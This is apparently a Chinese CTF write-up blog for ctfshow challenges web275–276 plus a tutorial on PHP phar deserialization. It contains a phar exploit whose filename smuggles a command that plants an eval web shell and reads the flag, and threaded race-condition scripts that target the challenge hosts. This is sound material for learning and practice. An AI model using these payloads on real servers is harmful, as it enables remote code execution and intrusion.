&#x2F;</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406201155401.png" alt="image-20220406201155401"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406201232755.png" alt="image-20220406201232755"></p><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable language_">$this</span>-&gt;filename))&#123;<span class="comment">#检查有没有php或者..</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable language_">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">#这里直接可以执行命令啊</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406203034003.png" alt="image-20220406203034003"></p><h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><p>位置跟277换了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable language_">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable language_">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>先改一下php.ini配置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406220641916.png" alt="image-20220406220641916"></p><p>生成phar 创建一个phar.phar</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;1|echo &#x27;&lt;?=@eval(\$_POST[1])?&gt;&#x27;&gt;&gt;1.php;tac f*&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">filter</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">thread_num=<span class="number">10</span></span><br><span class="line">thread_list=[]</span><br><span class="line">url = <span class="string">&#x27;http://79529c41-3bf4-48da-bac0-ab164e6811b7.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work5</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="comment">#?fn=phar://./phar.phar/</span></span><br><span class="line">    <span class="comment">#?fn=phar://phar.phar</span></span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=phar://phar.phar&quot;</span>,proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:2021&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work6</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=phar.phar&quot;</span>, data=data,proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:2021&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.text)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work7</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=/var/www/html/phar.phar&quot;</span>, data=data,proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:2021&#x27;</span>&#125;)</span><br><span class="line">    result = requests.get(url+<span class="string">&quot;?fn=phar://phar.phar&quot;</span>,proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:2021&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">        方法一：非预期</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        work7()</span><br><span class="line">        <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">        方法二：预期，条件竞争</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#work5()</span></span><br><span class="line">        <span class="comment">#work6()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> thread_num:</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        thread_num-=<span class="number">1</span></span><br><span class="line">        t.start()</span><br><span class="line">        thread_list.append(t)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#实践</span><br><span class="line"></span><br><span class="line">#?fn=phar://phar.phar</span><br><span class="line">#?fn=phar://./phar.phar 和?fn=phar://phar.phar/</span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line">警告，不生成</span><br><span class="line">Warning&lt;/b&gt;:  file_put_contents(phar://phar.phar): failed to open stream: phar error: file &amp;quot;&amp;quot; in phar &amp;quot;phar.phar&amp;quot; cannot be empty in &lt;b&gt;/var/www/html/index.php</span><br><span class="line">Warning&lt;/b&gt;:  copy(): The first argument to copy() function cannot be a directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;48&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">Warning&lt;/b&gt;:  unlink(/var/www/html/phar://phar.phar): No such file or directory in &lt;b&gt;/var/www/html/index.php</span><br><span class="line">因为目录下无phar.phar文件，故报错</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#羽师傅的解法</span><br><span class="line">#?fn=a </span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line">生成空txt</span><br><span class="line">因为：无post数据</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#方法一</span><br><span class="line">#?fn=/var/www/html/phar.phar会生成phar.phar文件</span><br><span class="line">#原因在于：file_put_contents($_GET[&#x27;fn&#x27;], $content);能生成phar.phar文件(绝对路径)，但unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);中fn与当前路径拼接会导致删除失败，故成功生成phar文件</span><br><span class="line">#但如果竞争就会生成部分空文件和部分phar内容的TXT，而且不生成phar.phar文件，不懂。。。可能冲突了？多线程没学好</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line">unlink(/var/www/html//var/www/html/phar.phar): No such file or directory in &lt;b&gt;/var/www/html/index.php</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">#假如phar.phar文件存在，则?fn=phar://phar.phar触发反序列化</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line">Warning&lt;/b&gt;:  file_put_contents(phar://phar.phar): failed to open stream: phar error: file &amp;quot;&amp;quot; in phar &amp;quot;phar.phar&amp;quot; cannot be empty in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;47&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">Warning&lt;/b&gt;:  copy(): The first argument to copy() function cannot be a directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;48&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">Warning&lt;/b&gt;:  unlink(/var/www/html/phar://phar.phar): No such file or directory in &lt;b&gt;/var/www/html/index.php</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line">实践后发现</span><br><span class="line">通过条件竞争，先?fn=phar.phar,data=数据，生成phar.phar</span><br><span class="line">然后?fn=phar://phar.phar</span><br><span class="line">unlink()/copy()/file_put_content()都可以触发phar反序列化</span><br><span class="line">但unlink前面有路径阻隔，本来想../绕过，发现..被过滤</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">thread_num = <span class="number">10</span> <span class="comment">#设置线程数</span></span><br><span class="line">thread_list = [] <span class="comment">#设置线程集合</span></span><br><span class="line">url = <span class="string">&quot;http://a69f9705-e24a-4a95-a0ff-606456852ce1.challenge.ctf.show/&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work5</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;?fn=phar://phar.phar&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work6</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;?fn=phar.phar&quot;</span>,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work7</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;?=/var/www/html/phar.phar&quot;</span>,data=data)</span><br><span class="line">    result = requests.get(url + <span class="string">&quot;?fn=phar://phar.phar&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line">        <span class="comment">#方法一:非预期</span></span><br><span class="line">        work7()</span><br><span class="line">        <span class="comment">#方法二:预期条件竞争</span></span><br><span class="line">        <span class="comment">#work5()</span></span><br><span class="line">        <span class="comment">#work6()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> thread_num:</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        thread_num -= <span class="number">1</span></span><br><span class="line">        t.start()</span><br><span class="line">        thread_list.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.join()</span><br></pre></td></tr></table></figure><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>phar文件本质是一种压缩文件,会以序列化的形式存储用户定义的meta-data.当受影响的文件操作函数调用phar文件时,会自动反序列化meta-data内的内容</p><h3 id="什么是phar文件"><a href="#什么是phar文件" class="headerlink" title="什么是phar文件"></a>什么是phar文件</h3><p>在软件中,PHAR(PHP归档)文件是一种打包格式,通过将许多php代码文件和其他资源(如图像 样式表等)捆绑到一个归档文件中来实现应用程序和库的分发.</p><p>php通过用户定义的内置的”流包装器”实现复杂的文件处理功能.内置包装器可以用于文件操作系统函数,如[fopen(),copy(),file_exists()和filesize().phar:&#x2F;&#x2F;就是一种内置的流包装器</p><p>php中一些常见的流包装器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p>phar文件的结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stub:phar文件的标志,必须以 xxx __HALT_COMPILER();?&gt;结尾,否则无法识别.xxx可为自定义内容</span><br><span class="line">manifest:phar 文件本质上是一种压缩文件,其中每个被压缩的文件的权限 属性等信息被放在这个部分.这个部分还会以序列化的形式存储用户自定义的meta-data,这是漏洞利用最核心的地方</span><br><span class="line">content:被压缩文件的内容</span><br><span class="line">signature (可空):签名,放在末尾</span><br></pre></td></tr></table></figure><p>生成一个phar文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>phar文件要能够上传到服务器端</li><li>要有可用的魔术方法作为跳板</li><li>文件操作函数的参数可控,且: &#x2F; phar等特殊字符没有被过滤</li></ol><h3 id="受影响函数"><a href="#受影响函数" class="headerlink" title="受影响函数"></a>受影响函数</h3><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412094509501.png" alt="image-20220412094509501"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exif</span></span><br><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line">    </span><br><span class="line"><span class="comment">//gd</span></span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom***系列函数</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hash</span></span><br><span class="line">    </span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line">    </span><br><span class="line"><span class="comment">// file/url</span></span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">    </span><br><span class="line"><span class="comment">//standard </span></span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstring</span><br><span class="line">    </span><br><span class="line"><span class="comment">// zip   </span></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ 